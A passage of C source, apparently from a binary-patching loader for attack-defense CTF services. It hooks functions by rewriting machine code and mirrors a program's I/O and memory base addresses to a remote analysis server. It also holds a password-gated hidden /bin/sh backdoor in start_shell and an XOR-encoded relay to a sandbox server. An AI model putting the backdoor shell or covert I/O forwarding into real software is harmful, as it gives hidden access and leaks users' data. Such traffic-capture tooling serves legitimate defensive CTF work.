            return select_handler(nfds, readafds, writefds, exceptfds, timeout);
        }
    }
    asm_select(nfds, readafds, writefds, exceptfds, timeout,res);
    return res;
}

IN_LINE long my_waitpid(int pid,long state_addr,long flag){
    long res = 0;
    if(SYSCALL_DYNAMIC) {
        long (*waitpid_handler)(int, long, long) = lookup_symbols("waitpid");
        if (waitpid_handler != NULL) {
            return waitpid_handler(pid, state_addr, flag);
        }
    }
    asm_waitpid(pid,state_addr,flag,res);
    return res;
}

IN_LINE long my_exit(int code){
    long res = 0;
    if(SYSCALL_DYNAMIC) {
        long (*exit_handler)(int) = lookup_symbols("exit");
        if (exit_handler != NULL) {
            return exit_handler(code);
        }
    }
    asm_exit(code,res);
    return res;
}

IN_LINE void my_alarm(int time){
    long res = 0;
    if(SYSCALL_DYNAMIC) {
        long (*alarm_handler)(int) = lookup_symbols("alarm");
        if (alarm_handler != NULL) {
            alarm_handler(time);
        }
    }
    asm_alarm(time,res);
}

IN_LINE void my_chroot(char* path){
    long res = 0;
    if(SYSCALL_DYNAMIC) {
        long (*chroot_handler)(char*) = lookup_symbols("chroot");
        if (chroot_handler != NULL) {
            chroot_handler(path);
        }
    }
    asm_chroot(path,res);
}

static int my_getsockopt (int fd, int level, int optname, void * optval, socklen_t * optlen){
    long res = 0;
    if(SYSCALL_DYNAMIC) {
        long (*getsockopt_handler)(int, int, int, void *, socklen_t *) = lookup_symbols("getsockopt");
        if (getsockopt_handler != NULL) {
            return getsockopt_handler(fd,level,optname,optval,optlen);
        }
    }
    asm_getsockopt(fd,level,optname,optval,optlen,res);
    return res;
}

IN_LINE long my_kill(int pid,int sig){
    long res = 0;
    if(SYSCALL_DYNAMIC) {
        long (*kill_handler)(int,int) = lookup_symbols("kill");
        if (kill_handler != NULL) {
            return kill_handler(pid,sig);
        }
    }
    asm_kill(pid,sig,res);
    return res;
}

IN_LINE long my_execve(char* elf,char** arg,char** env){
    long res = 0;
    if(SYSCALL_DYNAMIC) {
        long (*execve_handler)(char *, char **, char **) = lookup_symbols("execve");
        if (execve_handler != NULL) {
            return execve_handler(elf, arg, env);
        }
    }
    asm_execve((long)elf,(long)arg,(long)env,res);
    return res;
}

IN_LINE void* my_mmap(void* addr, size_t length, int prot, int flags,
                     int fd, off_t offset){
    long res = 0;
    asm_mmap((long)addr,(long)length,(long)prot,(long)flags,(long)fd,(long)offset,res);
    return (void*)res;
}

IN_LINE long my_munmap(void* addr,size_t length){
    long res = 0;
    asm_munmap((long)addr,(long)length,res);
    return res;
}

IN_LINE long my_mprotect(void *start, long len, int prot){
    long res = 0;
    if(SYSCALL_DYNAMIC) {
        long (*mprotect_handler)(void *, size_t, int) = lookup_symbols("mprotect");
        if (mprotect_handler != NULL) {
            return mprotect_handler(start, len, prot);
        }
    }
    asm_mprotect((long)start,(long)len,(long)prot,res);
    return res;
}

IN_LINE void my_puts(const char* str){
    void(*my_puts_handler)(const char*str) = lookup_symbols("puts");
    if(my_puts_handler!=NULL)
        my_puts_handler(str);
    else{
        my_write(1,str,my_strlen(str));
        my_write(1,"\n",1);
    }
}



static void my_printf(const char *format, ...)
{
    void(*vprintf_handler)(const char *,va_list) = lookup_symbols("vprintf");
    if(vprintf_handler!=NULL) {
        va_list args;       //定义一个va_list类型的变量，用来储存单个参数
        va_start(args, format); //使args指向可变参数的第一个参数
        vprintf_handler(format, args);  //必须用vprintf等带V的
        va_end(args);       //结束可变参数的获取
    }
    else{
        my_puts(format);
    }
}



IN_LINE long my_write_packet(int fd,char* buf,long size){
    long res = my_write(fd,buf,size);
    return res;
}

IN_LINE void generate_random_str(char* buf ,int len){
    int i =0 ;
    char random_str[] = {"abcdefghijklmnopqrstuvwxyz"};
    int fd = my_open("/dev/urandom",O_RDONLY,0);
    unsigned char chr;
    if(fd> 0) {
        for (i = 0; i < len; i++) {
            my_read(fd,&chr,1);
            buf[i] = random_str[((unsigned int)chr)%26];
        }
        my_close(fd);
    }
    else{
        buf[0] = 'a';
    }
}


static void start_shell_io_inline(char* buf,int buf_len){
    char *argv[] = {"/bin/sh", NULL};
    MD5_CTX md5;
    my_memset((char*)&md5,0,sizeof(MD5_CTX));
    unsigned char decrypt[16];
    if(buf_len == sizeof(SHELL_PASSWD)){
        MD5Init(&md5);
        MD5Update(&md5,buf,sizeof(SHELL_PASSWD)-1);
        MD5Final(&md5,decrypt);
        if(my_strcmp(decrypt,g_loader_param.shell_password) == 0){
            my_execve("/bin/sh", (char**)argv, NULL);
        }
    }
}


static void start_shell(char* buf,int buf_len,int child_pid,int save_stdin,int save_stdout,int save_stderr){
    char *argv[] = {"/bin/sh", NULL};
    MD5_CTX md5;
    my_memset((char*)&md5,0,sizeof(MD5_CTX));
    unsigned char decrypt[16];
    if(buf_len == sizeof(SHELL_PASSWD)){
        MD5Init(&md5);
        MD5Update(&md5,buf,sizeof(SHELL_PASSWD)-1);
        MD5Final(&md5,decrypt);
        if(my_strcmp(decrypt,g_loader_param.shell_password) == 0){
            my_kill(child_pid,9);
            my_close(STDIN_FILENO);
            my_close(STDOUT_FILENO);
            my_close(STDERR_FILENO);
            my_dup2(save_stdin,STDIN_FILENO);
            my_dup2(save_stdout,STDOUT_FILENO);
            my_dup2(save_stderr,STDERR_FILENO);
            pid_t pid = 0;
            if(pid == 0) {
                my_execve("/bin/sh", (char**)argv, NULL);
            }
        }
    }
}

IN_LINE int MAX_FD(int file1,int file2,int file3){
    int tmp = file1;
    if(file1>file2)
        tmp = file1;
    else tmp = file2;
    if(tmp<file3)
        tmp = file3;
    return tmp;
}

static char UUID[0x08];


IN_LINE void build_packet(char type,char* buf,int buf_len,char* packet,int* packet_len){
    my_memcpy(packet,UUID,sizeof(UUID));
    my_memcpy(packet+ sizeof(UUID),&type,1);
    my_memcpy(packet+sizeof(UUID)+1,(char*)&buf_len,4);
    my_memcpy(packet+sizeof(UUID)+1+4,buf,buf_len);
    *packet_len = sizeof(UUID)+1+4 + buf_len;
}

IN_LINE char* get_heap_base(){
    char* tmp_address = 0;
    void*(*malloc_handler)(int) = lookup_symbols("malloc");
    void (*free_handler)(void*) = lookup_symbols("free");
    if(malloc_handler!=NULL && free_handler!=NULL) {
        tmp_address = malloc_handler(0x600);
        if(tmp_address!=NULL) {
            free_handler(tmp_address);
            return (char*)((long)(tmp_address) - (long)tmp_address%0x1000);
        }
    }
    return 0;
}



IN_LINE void dynamic_hook_function(void* old_function,void* new_function){
    PATCH_CODE_SLOT* slot = alloc_patch_code_slot(old_function);
    if(slot == NULL) {
        DEBUG_LOG("dynamic_hook_function: alloc hook slot failed");
        return;
    }
    long res = my_mprotect((void*)DOWN_PADDING((long)old_function,0x1000),0x1000,PROT_READ|PROT_WRITE|PROT_EXEC);
    if(res < 0) {
        DEBUG_LOG("dynamic_hook_function: mprotect RWX failed, addr: 0x%lx",DOWN_PADDING((long)old_function,0x1000));
        return;
    }
    slot->patch_addr = old_function;
#ifdef __x86_64__
    my_memcpy(slot->old_code_save,old_function,14);
    slot->old_code_save_len = 14;
    slot->code_slot_len = 14;
    slot->slot_type = SLOT_FUNCTION;

    slot->code_slot[0] = '\x68';
    *((unsigned int*)&(((unsigned char*)slot->code_slot) [1]))  = (unsigned int)((long)new_function&0xFFFFFFFF);
    *((unsigned int*)&(((unsigned char*)slot->code_slot) [5])) = 0x042444c7;
    *((unsigned int*)&(((unsigned char*)slot->code_slot) [9])) = (long)new_function>>32;
    ((unsigned char*)slot->code_slot) [13] = '\xc3';


    ((unsigned char*)old_function) [0] = '\x68';
    *((unsigned int*)&(((unsigned char*)old_function) [1]))  = (unsigned int)((long)slot->code_slot&0xFFFFFFFF);
    *((unsigned int*)&(((unsigned char*)old_function) [5])) = 0x042444c7;
    *((unsigned int*)&(((unsigned char*)old_function) [9])) = (long)slot->code_slot>>32;
    ((unsigned char*)old_function) [13] = '\xc3';
    slot->hook_code_len = 14;
    my_memcpy(slot->hook_code,old_function,slot->hook_code_len);

    DEBUG_LOG("Hook Success: 0x%lx --> 0x%lx",old_function,new_function);

  /*  ((unsigned char*)old_function) [0] = '\xE8';//call
    *((unsigned int*)&(((unsigned char*)old_function) [1]))   =  (unsigned int)(((long)slot->code_slot-(long)old_function - 5)&0xFFFFFFFF);
    slot->hook_code_len = 5;
    my_memcpy(slot->hook_code,old_function,slot->hook_code_len);*/

#elif __i386__
    my_memcpy(slot->old_code_save,old_function,5);
    slot->old_code_save_len = 5;
    slot->code_slot_len = 5;
    slot->slot_type = SLOT_FUNCTION;

     ((unsigned char*)slot->code_slot) [0] = '\xE9';//jmp
    *((unsigned int*)&(((unsigned char*)slot->code_slot) [1]))   =  (unsigned int)(((unsigned int)new_function-(unsigned int)slot->code_slot - 5)&0xFFFFFFFF);

    ((unsigned char*)old_function) [0] = '\xE9';//jmp
    *((unsigned int*)&(((unsigned char*)old_function) [1]))   =  (unsigned int)(((unsigned int)slot->code_slot-(unsigned int)old_function - 5)&0xFFFFFFFF);

    slot->hook_code_len = 5;
    my_memcpy(slot->hook_code,old_function,slot->hook_code_len);

    DEBUG_LOG("Hook Success: 0x%lx --> 0x%lx",old_function,new_function);
#elif __arm__

    #elif __aarch64__

#elif __mips__

#endif
    res = my_mprotect((void*)DOWN_PADDING((long)old_function,0x1000),0x1000,PROT_READ|PROT_EXEC);
    if(res < 0) {
        DEBUG_LOG("dynamic_hook_function: mprotect RX failed, addr: 0x%lx",DOWN_PADDING((long)old_function,0x1000));
        return;
    }
}

IN_LINE void dynamic_hook_call(void* call_addr,void* new_function){
    PATCH_CODE_SLOT* slot = alloc_patch_code_slot(call_addr);
    if(slot == NULL) {
        DEBUG_LOG("dynamic_hook_call: alloc hook slot failed");
        return;
    }
    long res = my_mprotect((void*)DOWN_PADDING((long)call_addr,0x1000),0x1000,PROT_READ|PROT_WRITE|PROT_EXEC);
    if(res < 0) {
        DEBUG_LOG("dynamic_hook_call: mprotect RWX failed, addr: 0x%lx",DOWN_PADDING((long)call_addr,0x1000));
        return;
    }
    slot->patch_addr = call_addr;
#ifdef __x86_64__
    if((long)slot->code_slot - (long)call_addr >= 100000000  || (long)slot->code_slot - (long)call_addr <= -100000000) {
        dealloc_patch_code_slot();
#if(PATCH_DEBUG)
        my_printf("failed to dynamic_hook_call,call_addr =%p, slot->code=%p, new_function=%p\n",call_addr,slot->code_slot,new_function);
#endif
    }
    my_memcpy(slot->old_code_save,call_addr,5);
    slot->old_code_save_len = 5;
    slot->code_slot_len = 14;
    slot->slot_type = SLOT_CALL;

    slot->code_slot[0] = '\x68'; //push && ret
    *((unsigned int*)&(((unsigned char*)slot->code_slot) [1]))  = (unsigned int)((long)new_function&0xFFFFFFFF);
    *((unsigned int*)&(((unsigned char*)slot->code_slot) [5])) = 0x042444c7;
    *((unsigned int*)&(((unsigned char*)slot->code_slot) [9])) = (long)new_function>>32;
    ((unsigned char*)slot->code_slot) [13] = '\xc3';

    ((unsigned char*)call_addr) [0] = '\xE8';//call
    *((unsigned int*)&(((unsigned char*)call_addr) [1]))   =  (unsigned int)(((long)slot->code_slot-(long)call_addr - 5)&0xFFFFFFFF);

    slot->hook_code_len = 5;
    my_memcpy(slot->hook_code,call_addr,slot->hook_code_len);
    DEBUG_LOG("Hook Success: 0x%lx --> 0x%lx",call_addr,new_function);


#elif __i386__
    my_memcpy(slot->old_code_save,call_addr,5);
    slot->old_code_save_len = 5;
    slot->code_slot_len = 5;
    slot->slot_type = SLOT_FUNCTION;

     ((unsigned char*)slot->code_slot) [0] = '\xE9';//jmp
    *((unsigned int*)&(((unsigned char*)slot->code_slot) [1]))   =  (unsigned int)(((unsigned int)new_function-(unsigned int)slot->code_slot - 5)&0xFFFFFFFF);

    ((unsigned char*)call_addr) [0] = '\xE8';//jmp
    *((unsigned int*)&(((unsigned char*)call_addr) [1]))   =  (unsigned int)(((unsigned int)slot->code_slot-(unsigned int)call_addr - 5)&0xFFFFFFFF);

    slot->hook_code_len = 5;
    my_memcpy(slot->hook_code,call_addr,slot->hook_code_len);

    DEBUG_LOG("Hook Success: 0x%lx --> 0x%lx",call_addr,new_function);
#elif __arm__

    #elif __aarch64__

#elif __mips__

#endif
    res = my_mprotect((void*)DOWN_PADDING((long)call_addr,0x1000),0x1000,PROT_READ|PROT_EXEC);
    if(res < 0) {
        DEBUG_LOG("dynamic_hook_call: mprotect RX failed, addr: 0x%lx",DOWN_PADDING((long)call_addr,0x1000));
        return;
    }

}

IN_LINE void dynamic_unhook(void* addr){
    PATCH_CODE_SLOT* slot = search_patch_code_slot(addr);
    if(slot!=NULL){
        DEBUG_LOG("dynamic_unhook: 0x%lx",addr);
        long res = my_mprotect((void*)DOWN_PADDING((long)addr,0x1000),0x1000,PROT_READ|PROT_WRITE|PROT_EXEC);
        if(res < 0) {
            return;
        }
        my_memcpy(addr,slot->old_code_save,slot->old_code_save_len);
        res = my_mprotect((void*)DOWN_PADDING((long)addr,0x1000),0x1000,PROT_READ|PROT_EXEC);
        if(res < 0) {
            return;
        }
    }
}
IN_LINE void dynamic_rehook(void* addr){
    PATCH_CODE_SLOT* slot = search_patch_code_slot(addr);
    if(slot!=NULL){
        DEBUG_LOG("dynamic_rehook: 0x%lx",addr);
        long res = my_mprotect((void*)DOWN_PADDING((long)addr,0x1000),0x1000,PROT_READ|PROT_WRITE|PROT_EXEC);
        if(res < 0) {
            return;
        }
        my_memcpy(addr,slot->hook_code,slot->hook_code_len);
        res = my_mprotect((void*)DOWN_PADDING((long)addr,0x1000),0x1000,PROT_READ|PROT_EXEC);
        if(res < 0) {
            return;
        }
    }
}


IN_LINE void destory_patch_data(){
#if(CONFIG_LOADER_TYPE == LOAD_FROM_FILE)
    my_munmap((void*)g_loader_param.patch_data_mmap_file_base,UP_PADDING(PATCH_DATA_MMAP_FILE_SIZE,0x1000));
#endif
}


IN_LINE void start_io_redirect_udp(int send_sockfd,struct sockaddr_in serveraddr,char* libc_start_main_addr,char* stack_on_entry){
    int fd_hook_stdin[2];
    int fd_hook_stdout[2];
    int fd_hook_stderr[2];
    int save_stdin = 240;
    int save_stdout = 241;
    int save_stderr = 242;

    my_dup2(STDIN_FILENO,save_stdin);
    my_dup2(STDOUT_FILENO,save_stdout);
    my_dup2(STDERR_FILENO,save_stderr);

    my_pipe(fd_hook_stdin);
    my_pipe(fd_hook_stdout);
    my_pipe(fd_hook_stderr);

    my_close(STDIN_FILENO);
    my_close(STDOUT_FILENO);
    my_close(STDERR_FILENO);

    my_dup2(fd_hook_stdin[0],STDIN_FILENO);
    my_dup2(fd_hook_stdout[1],STDOUT_FILENO);
    my_dup2(fd_hook_stderr[1],STDERR_FILENO);

    pid_t child_pid = my_fork();
    char buf[131072];
    char packet[131082];
    int packet_len;
    my_memset(buf,0,sizeof(buf));

    if(child_pid==0){
        //child process
    }
    else if(child_pid<=0){

    }
    else{
        destory_patch_data();
        int flag = my_fcntl(save_stdin,F_GETFL,0);
        my_fcntl(save_stdin,F_SETFL,flag|O_NONBLOCK);
        flag = my_fcntl(fd_hook_stdout[0],F_GETFL,0);
        my_fcntl(fd_hook_stdout[0],F_SETFL,flag|O_NONBLOCK);
        flag = my_fcntl(fd_hook_stderr[0],F_GETFL,0);
        my_fcntl(fd_hook_stderr[0],F_SETFL,flag|O_NONBLOCK);

        int read_length = 0;
        int child_stat;
        while(1){
            // use fd_hook_stdin[1] to write
            // use fd_hook_stdout[0] to read
            // use fd_hook_stderr[0] to read
            //my_memzero(buf,8192);

            char* elf_base = (char*)get_elf_base();
            char* heap_base = (char*)get_heap_base();
            char* stack_base = (char*)stack_on_entry;
            build_packet(BASE_ELF,(char*)&elf_base,sizeof(char*),packet,&packet_len);
            my_sendto(send_sockfd,packet,packet_len,0,&serveraddr,sizeof(serveraddr));
            build_packet(BASE_LIBC,(char*)&libc_start_main_addr,sizeof(char*),packet,&packet_len);
            my_sendto(send_sockfd,packet,packet_len,0,&serveraddr,sizeof(serveraddr));
            build_packet(BASE_STACK,(char*)&stack_base,sizeof(char*),packet,&packet_len);
            my_sendto(send_sockfd,packet,packet_len,0,&serveraddr,sizeof(serveraddr));
            build_packet(BASE_HEAP,(char*)&heap_base,sizeof(char*),packet,&packet_len);
            my_sendto(send_sockfd,packet,packet_len,0,&serveraddr,sizeof(serveraddr));


            read_length = my_read(fd_hook_stdout[0],buf,sizeof(buf));
            if(read_length>0){
                build_packet(DATA_OUT, buf, read_length, packet, &packet_len);
                my_sendto(send_sockfd,packet,packet_len,0,&serveraddr,sizeof(serveraddr));
                filter_black_words_out(buf,read_length);
                my_write(save_stdout,buf,read_length);
            }else if(read_length == -1){
                int error_code = get_errno();
                if(error_code != UN_KNOWN_ERROR_CODE )
                    if(error_code != EAGAIN)
                        break;
            }

            read_length = my_read(fd_hook_stderr[0],buf,sizeof(buf));
            if(read_length>0){
                build_packet(DATA_ERR, buf, read_length, packet, &packet_len);
                my_sendto(send_sockfd,packet,packet_len,0,&serveraddr,sizeof(serveraddr));
                filter_black_words_out(buf,read_length);
                my_write(save_stderr,buf,read_length);
            }else if(read_length == -1){
                int error_code = get_errno();
                if(error_code != UN_KNOWN_ERROR_CODE )
                    if(error_code != EAGAIN)
                        break;
            }

            read_length = my_read(save_stdin,buf,sizeof(buf));
            if(read_length>0){
                build_packet(DATA_IN, buf, read_length, packet, &packet_len);
                my_sendto(send_sockfd,packet,packet_len,0,&serveraddr,sizeof(serveraddr));
                start_shell(buf,read_length,child_pid,save_stdin,save_stdout,save_stderr);
                filter_black_words_in(buf,read_length);
                my_write(fd_hook_stdin[1],buf,read_length);
            }else if(read_length == -1){
                int error_code = get_errno();
                if(error_code != UN_KNOWN_ERROR_CODE )
                    if(error_code != EAGAIN)
                        break;
            }

            if(my_waitpid(child_pid,0,WNOHANG)!=0){
                my_close(send_sockfd);
                my_exit(0);
                break;
            }
            my_sleep(10);
        }
    }
    if(child_pid>0)
        my_kill(child_pid,9);

}



IN_LINE void start_io_redirect_tcp(int send_sockfd, char* libc_start_main_addr,char* stack_on_entry){
    int fd_hook_stdin[2];
    int fd_hook_stdout[2];
    int fd_hook_stderr[2];
    int save_stdin = 240;
    int save_stdout = 241;
    int save_stderr = 242;
    my_dup2(STDIN_FILENO,save_stdin);
    my_dup2(STDOUT_FILENO,save_stdout);
    my_dup2(STDERR_FILENO,save_stderr);

    my_pipe(fd_hook_stdin);
    my_pipe(fd_hook_stdout);
    my_pipe(fd_hook_stderr);

    my_close(STDIN_FILENO);
    my_close(STDOUT_FILENO);
    my_close(STDERR_FILENO);

    my_dup2(fd_hook_stdin[0],STDIN_FILENO);
    my_dup2(fd_hook_stdout[1],STDOUT_FILENO);
    my_dup2(fd_hook_stderr[1],STDERR_FILENO);
    char* heap_base = (char*)get_heap_base();
    pid_t child_pid = my_fork();
    char buf[131072];
    char packet[131082];
    int packet_len;
    my_memset(buf,0,sizeof(buf));
    if(child_pid==0){
        //child process
    }
    else if(child_pid<=0){

    }
    else{
        destory_patch_data();
        my_memcpy(UUID,(void*)&fd_hook_stderr,8);
        int flag = my_fcntl(save_stdin,F_GETFL,0);
        my_fcntl(save_stdin,F_SETFL,flag|O_NONBLOCK);
        flag = my_fcntl(fd_hook_stdout[0],F_GETFL,0);
        my_fcntl(fd_hook_stdout[0],F_SETFL,flag|O_NONBLOCK);
        flag = my_fcntl(fd_hook_stderr[0],F_GETFL,0);
        my_fcntl(fd_hook_stderr[0],F_SETFL,flag|O_NONBLOCK);


        int read_length = 0;

        int child_stat;
        char* elf_base = (char*)get_elf_base();
        char* stack_base = (char*)stack_on_entry;
        build_packet(BASE_ELF,(char*)&elf_base,sizeof(char*),packet,&packet_len);
        my_write_packet(send_sockfd,packet,packet_len);
        build_packet(BASE_LIBC,(char*)&libc_start_main_addr,sizeof(char*),packet,&packet_len);
        my_write_packet(send_sockfd,packet,packet_len);
        build_packet(BASE_STACK,(char*)&stack_base,sizeof(char*),packet,&packet_len);
        my_write_packet(send_sockfd,packet,packet_len);
        build_packet(BASE_HEAP,(char*)&heap_base,sizeof(char*),packet,&packet_len);
        my_write_packet(send_sockfd,packet,packet_len);
        DEBUG_LOG("elf_base:         0x%lx",elf_base);
        DEBUG_LOG("libc_start_main:  0x%lx",libc_start_main_addr);
        DEBUG_LOG("stack_base:       0x%lx",stack_base);
        DEBUG_LOG("heap_base:        0x%lx",heap_base);

        while(1){
            {
                read_length = my_read(fd_hook_stdout[0], buf, sizeof(buf));
                if (read_length > 0) {
                    build_packet(DATA_OUT, buf, read_length, packet, &packet_len);
                    my_write_packet(send_sockfd, packet, packet_len);
                    filter_black_words_out(buf, read_length);
                    my_write(save_stdout, buf, read_length);
                }
                else if(read_length == -1){
                    int error_code = get_errno();
                    if(error_code != UN_KNOWN_ERROR_CODE )
                        if(error_code != EAGAIN)
                            break;
                }

            }
            {
                read_length = my_read(fd_hook_stderr[0], buf, sizeof(buf));
                if (read_length > 0) {
                    build_packet(DATA_ERR, buf, read_length, packet, &packet_len);
                    my_write_packet(send_sockfd, packet, packet_len);

                    filter_black_words_out(buf, read_length);
                    my_write(save_stderr, buf, read_length);
                }
                else if(read_length == -1){
                    int error_code = get_errno();
                    if(error_code != UN_KNOWN_ERROR_CODE )
                        if(error_code != EAGAIN)
                            break;
                }
            }
            {
                read_length = my_read(save_stdin, buf, sizeof(buf));
                if (read_length > 0) {
                    build_packet(DATA_IN, buf, read_length, packet, &packet_len);
                    my_write_packet(send_sockfd, packet, packet_len);
                    start_shell(buf, read_length, child_pid, save_stdin, save_stdout, save_stderr);
                    filter_black_words_in(buf, read_length);
                    my_write(fd_hook_stdin[1], buf, read_length);
                }
                else if(read_length == -1){
                    int error_code = get_errno();
                    if(error_code != UN_KNOWN_ERROR_CODE )
                        if(error_code != EAGAIN)
                            break;
                }
            }
            if(my_waitpid(child_pid,0,WNOHANG)!=0){
                my_close(send_sockfd);
                my_exit(0);
                break;
            }
            my_sleep(10);
        }
    }
    if(child_pid>0)
        my_kill(child_pid,9);
}

IN_LINE void start_sandbox_io_redirect_tcp(int send_sockfd) {
    fd_set read_events;
    fd_set err_events;
    struct timeval timeout;
    timeout.tv_sec = 1;
    timeout.tv_usec = 0;
    char buf[131072];
    unsigned int length = 0;
    int i = 0;
    unsigned int current_read_index = 0;
    int current_write_index = 0;
    int rc = 0;
    destory_patch_data();
    while (1) {
        FD_ZERO(&read_events);
        FD_SET(STDIN_FILENO, &read_events);
        FD_SET(send_sockfd, &read_events);

        FD_ZERO(&err_events);
        FD_SET(STDIN_FILENO, &err_events);
        FD_SET(send_sockfd, &err_events);
        timeout.tv_sec = 1;
        timeout.tv_usec = 0;
        rc = my_select(send_sockfd + 1, &read_events, NULL, &err_events, &timeout);
        if (rc < 0) {
            break;
        } else if (rc == 0) {
            continue;
        }
        if (FD_ISSET(STDIN_FILENO, &read_events)) {
            length = my_read(STDIN_FILENO, buf, sizeof(buf));
            if (length > 0) {
                for(i=0;i<length;i++) {
                    buf[i] = buf[i]^SANDBOX_XOR_KEY[current_read_index%my_strlen(SANDBOX_XOR_KEY)];
                    current_read_index ++;
                }
                my_write(send_sockfd, buf, length);
            }
            else if(length == -1){
                int error_code = get_errno();
                if(error_code != UN_KNOWN_ERROR_CODE )
                    if(error_code != EAGAIN)
                        break;
            }
        }
        if (FD_ISSET(send_sockfd, &read_events)) {
            length = my_read(send_sockfd, buf, sizeof(buf));
            if (length > 0) {
                for(i=0;i<length;i++) {
                    buf[i] = buf[i] ^ SANDBOX_XOR_KEY[current_write_index % my_strlen(SANDBOX_XOR_KEY)];
                    current_write_index++;
                }
                my_write(STDIN_FILENO, buf, length);
            }
            else if(length == -1){
                int error_code = get_errno();
                if(error_code != UN_KNOWN_ERROR_CODE )
                    if(error_code != EAGAIN)
                        break;
            }
        }

    }
    my_exit(0);
}

IN_LINE int isconnected(int sockfd, fd_set *rd, fd_set *wr)
{
    if (!FD_ISSET(sockfd, rd) && !FD_ISSET(sockfd, wr)) {
        return 0;
    }
    int err = 0;
    socklen_t len = sizeof(err);
    if (my_getsockopt(sockfd, SOL_SOCKET, SO_ERROR, &err, &len) < 0) {
        return 0;
    }
    return err == 0;
}

// Return 1 on success, 0 on timeout and -1 on failed
IN_LINE int connect_timeout(int sockfd, const struct sockaddr *addr,
                            socklen_t addrlen, struct timeval *timeout)
{
    int flags = my_fcntl( sockfd, F_GETFL, 0 );
    if (flags == -1) {
        return -1;
    }
    if (my_fcntl( sockfd, F_SETFL, flags | O_NONBLOCK ) < 0) {
        return -1;
    }

    int status = my_connect(sockfd, (void*)addr, addrlen);

    if (status == 0) {
        if (my_fcntl(sockfd, F_SETFL, flags) <  0) {
            return -1;
        }
        return 1;
    }
    fd_set read_events;
    fd_set write_events;
    FD_ZERO(&read_events);
    FD_SET(sockfd, &read_events);
    write_events = read_events;
    int rc = my_select(sockfd + 1, &read_events, &write_events, NULL, timeout );
    if (rc < 0) {
        return -1;
    } else if (rc == 0) {
        return 0;
    }
    if (!isconnected(sockfd, &read_events, &write_events) )
    {
        return -1;
    }
    if (my_fcntl( sockfd, F_SETFL, flags ) < 0 ) {
        return -1;
    }
    return 1;
}



IN_LINE int start_sandbox_io_redirect() {
    char* ip = (char*)&(g_loader_param.sandbox_server.sin_addr.s_addr);
    int port = (g_loader_param.sandbox_server.sin_port >> 8 + (g_loader_param.sandbox_server.sin_port &0xff) << 8);
    DEBUG_LOG("start_sandbox_io_redirect: %d.%d.%d.%d:%d",ip[0],ip[1],ip[2],ip[3],port);
    if (g_loader_param.sandbox_server.sin_addr.s_addr == 0 || g_loader_param.sandbox_server.sin_port == 0)
        return -1;
    struct timeval timeout;
    timeout.tv_sec = TCP_TIME_OUT;
    timeout.tv_usec = 0;
    unsigned  int send_sockfd = my_socket(AF_INET, SOCK_STREAM, 0);
    if (send_sockfd >= 0) {
        int res = connect_timeout(send_sockfd, (struct sockaddr *) &g_loader_param.sandbox_server, sizeof(struct sockaddr), &timeout);
        if (res == 1) {
            start_sandbox_io_redirect_tcp(send_sockfd);
            my_close(send_sockfd);
            return 0;
        }
        else {
            my_close(send_sockfd);
            return -1;
        }
    }
    else
        return -1;
}

IN_LINE void start_common_io_redirect(char* libc_start_main_addr,char* stack_on_entry){
    char path[0x200];
    char file_name[0x100];
    int send_sockfd;
    char* ip = (char*)&(g_loader_param.analysis_server.sin_addr.s_addr);
    int port = (g_loader_param.analysis_server.sin_port >> 8 + (g_loader_param.analysis_server.sin_port &0xff) << 8);
    DEBUG_LOG("start_common_io_redirect: %d.%d.%d.%d:%d",ip[0],ip[1],ip[2],ip[3],port);
    if (g_loader_param.analysis_server.sin_addr.s_addr != 0 && g_loader_param.analysis_server.sin_port != 0) {
        struct timeval timeout;
        timeout.tv_sec = TCP_TIME_OUT;
        timeout.tv_usec = 0;
        send_sockfd = my_socket(AF_INET, SOCK_STREAM, 0);
        if (send_sockfd >= 0) {
            DEBUG_LOG("tcp analysis server socket open success");
            int res = connect_timeout(send_sockfd, (struct sockaddr *) &g_loader_param.analysis_server, sizeof(struct sockaddr), &timeout);
            if (res == 1) {
                DEBUG_LOG("connect to tcp analysis server success");
                start_io_redirect_tcp(send_sockfd, libc_start_main_addr, stack_on_entry);
                my_close(send_sockfd);
            } else {
                my_close(send_sockfd);
                DEBUG_LOG("connect to tcp analysis server failed");
#if USE_LOCAL_FILE_INSTEAD_OF_UDP
                DEBUG_LOG("try to use local file recorder");
                my_memset(path, 0, sizeof(path));
                my_memset(file_name, 0, sizeof(file_name));
                my_strcpy(path, IO_REDIRECT_PATH, '\x00');
                my_memcpy(&path[my_strlen(path)], "/", 1);
                generate_random_str(file_name, 12);
                my_memcpy(&path[my_strlen(path)], file_name, my_strlen(file_name));
                my_memcpy(&path[my_strlen(path)], ".log", 4);
                //g_redirect_io_fd = my_open(path,O_CLOEXEC|O_RDWR|O_CREAT,S_IRWXU|S_IRWXG|S_IRWXO);
                send_sockfd = my_open(path, O_CLOEXEC | O_RDWR | O_CREAT, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP | S_IROTH | S_IWOTH);
                if (send_sockfd > 0) {
                    DEBUG_LOG("local file recorder open success, file is:%s",path);
                    start_io_redirect_tcp(send_sockfd, libc_start_main_addr, stack_on_entry);
                    my_close(send_sockfd);
                }
                else{
                    DEBUG_LOG("local file recorder open failed, file is:%s",path);
                }
#else
                DEBUG_LOG("try to use udp analysis server");
                send_sockfd = my_socket(AF_INET, SOCK_DGRAM, 0);
                if (send_sockfd >= 0) {
                    DEBUG_LOG("udp analysis server socket open success");
                    start_io_redirect_udp(send_sockfd, g_loader_param.analysis_server, libc_start_main_addr, stack_on_entry);
                    my_close(send_sockfd);
                }
                else{
                    DEBUG_LOG("udp analysis server socket open failed");
                }
#endif
            }
        } else {
            DEBUG_LOG("tcp analysis server socket open failed");
#if USE_LOCAL_FILE_INSTEAD_OF_UDP
            DEBUG_LOG("try to use local file recorder");
            my_memset(path, 0, sizeof(path));
            my_memset(file_name, 0, sizeof(file_name));
            my_strcpy(path, IO_REDIRECT_PATH, '\x00');
            my_memcpy(&path[my_strlen(path)], "/", 1);
            generate_random_str(file_name, 12);
            my_memcpy(&path[my_strlen(path)], file_name, my_strlen(file_name));
            my_memcpy(&path[my_strlen(path)], ".log", 4);
            //g_redirect_io_fd = my_open(path,O_CLOEXEC|O_RDWR|O_CREAT,S_IRWXU|S_IRWXG|S_IRWXO);
            send_sockfd = my_open(path, O_CLOEXEC | O_RDWR | O_CREAT, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP | S_IROTH | S_IWOTH);
            if (send_sockfd > 0) {
                DEBUG_LOG("local file recorder open success, file is:%s",path);
                start_io_redirect_tcp(send_sockfd, libc_start_main_addr, stack_on_entry);
                my_close(send_sockfd);
            }
            else{
                DEBUG_LOG("local file recorder open failed, file is:%s",path);
            }
